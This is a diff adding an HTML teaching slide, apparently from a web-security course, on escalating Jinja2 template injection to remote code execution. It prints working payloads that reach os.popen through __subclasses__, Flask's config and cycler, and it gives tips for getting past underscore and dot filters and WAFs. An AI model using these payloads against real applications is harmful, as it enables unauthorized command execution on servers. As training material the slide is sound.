@@ -1,0 +1,37 @@
+<section>
+  <h2 class="section-title">Jinja2 &mdash; from <code>7&times;7</code> to RCE</h2>
+  <div class="card card-red full-width">
+    <div class="card-header">the classic walk &mdash; reach <code>os</code> through <code>__class__</code></div>
+    <pre><code class="language-jinja">&#123;&#123; ''.__class__ &#125;&#125;
+   &rarr; &lt;class 'str'&gt;
+
+&#123;&#123; ''.__class__.__mro__ &#125;&#125;
+   &rarr; (&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+
+&#123;&#123; ''.__class__.__mro__[1].__subclasses__() &#125;&#125;
+   &rarr; [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, ..., &lt;class 'subprocess.Popen'&gt;, ...]
+
+&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read() &#125;&#125;
+   &rarr; uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+  </div>
+  <div class="two-col" style="margin-top: 14px;">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">shorter &mdash; via Flask's <code>config</code></div>
+        <pre><code class="language-jinja">&#123;&#123; config.__class__.__init__
+   .__globals__['os'].popen('id').read() &#125;&#125;</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">payload-friendly &mdash; via <code>cycler</code></div>
+        <pre><code class="language-jinja">&#123;&#123; cycler.__init__.__globals__.os
+   .popen('id').read() &#125;&#125;</code></pre>
+      </div>
+    </div>
+  </div>
+  <div class="textbox" style="margin-top: 14px;">
+    <p><span class="inline-tag tag-purple">The trick</span> Every Python object exposes <code>__class__</code>. Walk to a class whose <code>__init__</code> was defined in a module that imports <code>os</code> &mdash; then <code>__globals__</code> hands you a live reference to <code>os</code>. From there, <code>popen</code> &rarr; RCE.</p>
+    <p><span class="inline-tag tag-cyan">Filtered <code>_</code> or <code>.</code>?</span> Use <code>request|attr('__class__')</code>, or <code>['__class__']</code>, or <code>|attr</code>+chain. Most WAFs lose this fight.</p>
+  </div>
+</section>
